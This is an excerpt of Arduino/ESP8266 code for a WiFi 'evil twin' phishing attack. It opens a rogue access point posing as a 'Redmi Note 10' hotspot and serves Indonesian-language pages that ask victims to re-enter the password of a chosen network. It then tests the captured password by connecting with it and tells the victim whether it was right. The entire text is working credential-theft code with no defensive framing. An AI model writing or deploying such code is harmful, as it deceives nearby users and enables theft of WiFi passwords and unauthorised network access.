...
void setup() {
  ...
  WiFi.softAP("Redmi Note 10", "YellowPurple");
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password Salah!</h2><p>Tolong masukan password yang benar.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>YEY, PASSWORD ANDA BENAR</h2></body> </html>");
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (webServer.hasArg("password")) {
      ...
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>MOHON TUNGGU, SEDANG VERIFIKASI SANDI WIFI</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>MASUKAN PASSWORD WIFI YANG BARU UNUK TERKONEKSI DENGAN '" + _selectedNetwork.ssid + "'  </h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
    }
  }
